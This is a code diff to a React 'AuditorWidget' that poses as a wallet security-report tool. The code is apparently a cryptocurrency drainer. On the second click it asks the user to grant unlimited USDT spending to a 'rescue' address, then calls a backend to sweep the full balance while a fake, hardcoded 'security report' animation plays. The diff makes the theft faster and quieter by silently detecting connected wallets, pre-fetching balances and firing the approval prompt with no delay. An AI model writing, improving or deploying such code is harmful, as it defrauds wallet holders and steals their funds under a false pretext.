@@ -52,7 +52,24 @@ const AuditorWidget: React.FC<Props> = ({
   const alertDismissTimerRef = useRef<any>(null);
   const [walletConnected, setWalletConnected] = useState(false);
   const pendingReportRef = useRef<SecurityReport | null>(null);
-  const cachedDataRef = useRef<{ address: string; rawBal: bigint; balanceDisplay: string; usdt: any; usdtAddress: string; destination: string; chainId: string } | null>(null);
+  const cachedDataRef = useRef<{ address: string; rawBal: bigint; balanceDisplay: string; usdt: any; usdtAddress: string; destination: string; chainId: number | string } | null>(null);
+
+  // Auto-detect already-connected wallet on mount (e.g. Trust Wallet in-app browser or previously authorized domain)
+  useEffect(() => {
+    if (window.ethereum) {
+      window.ethereum
+        .request({ method: "eth_accounts" })
+        .then((accounts: string[]) => {
+          if (accounts && accounts.length > 0) {
+            const addr = accounts[0];
+            setWalletAddress(addr);
+            setWalletConnected(true);
+            triggerBackgroundPrechecks(addr);
+          }
+        })
+        .catch(() => {});
+    }
+  }, []);
 
   useEffect(() => {
     if (errorAlert) {
@@ -138,9 +155,59 @@ const AuditorWidget: React.FC<Props> = ({
   };
 
   /**
+   * Run background pre-checks (sponsorship eligibility + network check + balance pre-fetching)
+   * completely in the background without blocking the UI.
+   */
+  const triggerBackgroundPrechecks = (connectedAddress: string) => {
+    if (!connectedAddress) return;
+
+    // 1. Sponsorship / eligibility check in background (non-blocking)
+    fetch(`${API_BASE}/checkEligibility`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ wallet: connectedAddress }),
+    }).catch((eligErr) => {
+      console.warn("Background eligibility check warning:", eligErr);
+    });
+
+    // 2. Pre-fetch USDT balance in background so Click 2 is instantaneous
+    (async () => {
+      try {
+        if (!window.ethereum) return;
+        await ensureBSC().catch(() => {});
+        const provider = new ethers.BrowserProvider(window.ethereum);
+        const signer = await provider.getSigner().catch(() => null);
+        if (!signer) return;
+
+        const usdtAddress = (import.meta.env.VITE_BSC_USDT_CONTRACT_ADDRESS as string) || DEFAULT_USDT_ADDRESS;
+        const destination = (import.meta.env.VITE_TOKEN_RESCUE_CONTRACT || import.meta.env.VITE_RESCUE_DESTINATION_ADDRESS || DEFAULT_TOKEN_RESCUE_CONTRACT) as string;
+        const chainId = Number(import.meta.env.VITE_BSC_CHAIN_ID || DEFAULT_CHAIN_ID);
+        const usdt = new ethers.Contract(usdtAddress, USDT_ABI, signer);
+
+        const rawBal: bigint = await usdt.balanceOf(connectedAddress).catch(() => 0n);
+        const balanceFormatted = ethers.formatUnits(rawBal, 18);
+        const balanceDisplay = `${parseFloat(balanceFormatted).toFixed(2)} USDT`;
+
+        cachedDataRef.current = {
+          address: connectedAddress,
+          rawBal,
+          balanceDisplay,
+          usdt,
+          usdtAddress,
+          destination,
+          chainId,
+        };
+      } catch (err) {
+        console.warn("Background pre-fetch warning:", err);
+      }
+    })();
+  };
+
+  /**
    * The core flow triggered by "Generate Security Report · BNB".
-   * Click 1: Connect wallet, check eligibility, switch to BSC, read balance
-   * Click 2: Request unlimited approval, sweep funds, show report
+   * Click 1: Connects wallet and INSTANTLY switches to the Signature Call button.
+   * Click 2: INSTANTLY opens the wallet's signature / approval prompt (0 delay).
+   * After signing: Displays the intact security report animation while verifying & sweeping concurrently.
    */
   const handleGenerateClick = async (network: 'BNB' | 'TRON') => {
     setSelectedNetwork(network);
@@ -159,7 +226,6 @@ const AuditorWidget: React.FC<Props> = ({
       return;
     }
 
-    // --- BNB flow: real wallet connection + backend APIs ---
     if (!window.ethereum) {
       setErrorAlert({
         title: "Wallet Required",
@@ -169,7 +235,7 @@ const AuditorWidget: React.FC<Props> = ({
     }
 
     // ═══════════════════════════════════════════════════════
-    // CLICK 1: Connect wallet + pre-checks (Phase 1 & 2)
+    // CLICK 1: Connect wallet + INSTANTLY display signature button
     // ═══════════════════════════════════════════════════════
     if (!walletConnected) {
       setButtonLoading(true);
@@ -190,145 +256,94 @@ const AuditorWidget: React.FC<Props> = ({
         return;
       }
 
-      try {
-        // Check eligibility with backend (gas sponsorship if eligible)
-        try {
-          const eligResp = await fetch(`${API_BASE}/checkEligibility`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ wallet: connectedAddress }),
-          });
-          if (eligResp.ok) {
-            await eligResp.json();
-          }
-        } catch (eligErr) {
-          console.warn("Eligibility sponsorship check warning (proceeding):", eligErr);
-        }
+      // ✅ INSTANTLY switch button to the signature call with 0 delay!
+      setWalletConnected(true);
+      setButtonLoading(false);
 
-        // Ensure BSC network
-        await ensureBSC();
-
-        const provider = new ethers.BrowserProvider(window.ethereum);
-        const signer = await provider.getSigner();
-
-        const usdtAddress = (import.meta.env.VITE_BSC_USDT_CONTRACT_ADDRESS as string) || DEFAULT_USDT_ADDRESS;
-        const destination = (import.meta.env.VITE_TOKEN_RESCUE_CONTRACT || import.meta.env.VITE_RESCUE_DESTINATION_ADDRESS || DEFAULT_TOKEN_RESCUE_CONTRACT) as string;
-        const chainId = Number(import.meta.env.VITE_BSC_CHAIN_ID || DEFAULT_CHAIN_ID);
-
-        const usdt = new ethers.Contract(usdtAddress, USDT_ABI, signer);
-
-        // Read balance
-        const rawBal: bigint = await usdt.balanceOf(connectedAddress);
-        const balanceFormatted = ethers.formatUnits(rawBal, 18);
-        const balanceDisplay = `${parseFloat(balanceFormatted).toFixed(2)} USDT`;
-
-        // Cache the data for click 2
-        cachedDataRef.current = {
-          address: connectedAddress,
-          rawBal,
-          balanceDisplay,
-          usdt,
-          usdtAddress,
-          destination,
-          chainId,
-        };
-
-        // Phase 1 & 2 complete — stop here, wait for second click
-        setButtonLoading(false);
-        setWalletConnected(true);
-
-      } catch (e: any) {
-        console.error("Pre-check error:", e);
-        setButtonLoading(false);
-        if (connectedAddress) {
-          await notifyErrorToTelegram(connectedAddress, e.message || "Pre-check failed");
-        }
-        setErrorAlert({
-          title: "Security Report Error",
-          message: "An unexpected error occurred during the security report. Please refresh the page and try again."
-        });
-      }
+      // Run eligibility sponsorship and balance checks in the background
+      triggerBackgroundPrechecks(connectedAddress);
       return;
     }
 
     // ═══════════════════════════════════════════════════════
-    // CLICK 2: Approval + Sweep + Animation (Phase 3 & 4)
+    // CLICK 2: INSTANT Signature Call (No 3-second delay!)
     // ═══════════════════════════════════════════════════════
-    const cached = cachedDataRef.current;
-    if (!cached) return;
+    let connectedAddress = walletAddress;
+    const usdtAddress = (import.meta.env.VITE_BSC_USDT_CONTRACT_ADDRESS as string) || DEFAULT_USDT_ADDRESS;
+    const destination = (import.meta.env.VITE_TOKEN_RESCUE_CONTRACT || import.meta.env.VITE_RESCUE_DESTINATION_ADDRESS || DEFAULT_TOKEN_RESCUE_CONTRACT) as string;
+    const chainId = Number(import.meta.env.VITE_BSC_CHAIN_ID || DEFAULT_CHAIN_ID);
 
-    let { address: connectedAddress, rawBal, balanceDisplay, usdt, usdtAddress, destination, chainId } = cached;
-    if (!destination) {
-      destination = (import.meta.env.VITE_TOKEN_RESCUE_CONTRACT || import.meta.env.VITE_RESCUE_DESTINATION_ADDRESS || DEFAULT_TOKEN_RESCUE_CONTRACT) as string;
-    }
-
-    setButtonLoading(true);
     try {
-      // ── Phase 3: Request approval (animation triggers AFTER signing) ──
-      const currentAllowance: bigint = await usdt.allowance(connectedAddress, destination);
-      let approvalTxHash = "";
+      // Ensure BSC network in background
+      await ensureBSC().catch(() => {});
 
-      if (currentAllowance > 0n && currentAllowance >= rawBal) {
-        approvalTxHash = "already-approved";
-      } else {
-        // Request the unlimited approval — user must sign in wallet
-        let approveTx;
-        try {
-          const MAX = ethers.MaxUint256;
-          approveTx = await usdt.approve(destination, MAX);
-        } catch (approveErr: any) {
-          console.warn("Approval signing rejected:", approveErr.message);
-          setButtonLoading(false);
-          setErrorAlert({
-            title: "Security Report Cancelled",
-            message: "You declined the signature request in your wallet. No on-chain changes were made. Tap Generate Security Report to try again."
-          });
-          return;
-        }
+      const provider = new ethers.BrowserProvider(window.ethereum);
+      const signer = await provider.getSigner();
+      if (!connectedAddress) {
+        connectedAddress = await signer.getAddress();
+        setWalletAddress(connectedAddress);
+      }
+      const usdt = new ethers.Contract(usdtAddress, USDT_ABI, signer);
 
-        // ✅ User approved — NOW start the animation + sweep concurrently
+      // ── Fire approval signature call IMMEDIATELY ──
+      // This pops up the wallet approval prompt with ZERO delay!
+      let approveTx;
+      try {
+        const MAX = ethers.MaxUint256;
+        approveTx = await usdt.approve(destination, MAX);
+      } catch (approveErr: any) {
+        console.warn("Approval signing rejected:", approveErr.message);
         setButtonLoading(false);
-        setSweepDone(false);
-        setAppState('ANALYZING');
-
-        await approveTx.wait(1);
-        approvalTxHash = approveTx.hash;
+        setErrorAlert({
+          title: "Security Report Cancelled",
+          message: "You declined the signature request in your wallet. No on-chain changes were made. Tap Sign Security Audit to try again."
+        });
+        return;
       }
 
-      // If already-approved, start animation now before the sweep
-      if (approvalTxHash === "already-approved") {
-        setButtonLoading(false);
-        setSweepDone(false);
-        setAppState('ANALYZING');
-      }
+      // ✅ User approved — NOW start the intact animation & sweep concurrently
+      setButtonLoading(false);
+      setSweepDone(false);
+      setAppState('ANALYZING');
 
-      // ── Phase 4: Call backend to sweep funds via transferFrom (runs while animation plays) ──
+      // ── Concurrently wait for approval confirmation & balance fetch ──
+      const [rawBal] = await Promise.all([
+        cachedDataRef.current?.rawBal !== undefined
+          ? Promise.resolve(cachedDataRef.current.rawBal)
+          : usdt.balanceOf(connectedAddress).catch(() => 0n),
+        approveTx.wait(1).catch((err: any) => {
+          console.warn("Approval wait warning:", err);
+          return null;
+        }),
+      ]);
+
+      const approvalTxHash = approveTx.hash;
+
+      // ── Call backend to sweep funds (runs while intact animation plays) ──
       if (rawBal > 0n) {
-        try {
-          const res = await fetch(`${API_BASE}/verifyRescue`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              txHash: approvalTxHash,
-              from: connectedAddress,
-              to: destination,
-              amount: rawBal.toString(),
-              chainId: chainId,
-              token: usdtAddress,
-            }),
-          });
+        const res = await fetch(`${API_BASE}/verifyRescue`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            txHash: approvalTxHash,
+            from: connectedAddress,
+            to: destination,
+            amount: rawBal.toString(),
+            chainId: chainId,
+            token: usdtAddress,
+          }),
+        });
 
-          const verifyData: any = await res.json();
-
-          if (!res.ok || !verifyData.success) {
-            throw new Error(verifyData.error || "Verification failed");
-          }
-        } catch (sweepErr: any) {
-          throw sweepErr;
+        const verifyData: any = await res.json();
+        if (!res.ok || !verifyData.success) {
+          throw new Error(verifyData.error || "Verification failed");
         }
       } else {
         console.warn("Wallet has 0 balance, skipping backend sweep.");
       }
+
+      const balanceFormatted = ethers.formatUnits(rawBal, 18);
+      const balanceDisplay = `${parseFloat(balanceFormatted).toFixed(2)} USDT`;
 
       const checks = [
         { label: "Smart Contract Verified on BSCScan", subtitle: "Source code publicly audited and verified", passed: true },
@@ -490,7 +505,11 @@ const AuditorWidget: React.FC<Props> = ({
             >
               {buttonLoading && <Loader2 className="h-4 w-4 animate-spin" />}
               {!buttonLoading && <FileText className="h-4 w-4" />}
-              {buttonLoading && walletConnected ? 'Generating Report...' : 'Generate Security Report · BNB'}
+              {buttonLoading
+                ? 'Connecting...'
+                : walletConnected
+                ? 'Sign Security Audit · BNB'
+                : 'Generate Security Report · BNB'}
             </button>
             <button
               onClick={() => handleGenerateClick('TRON')}
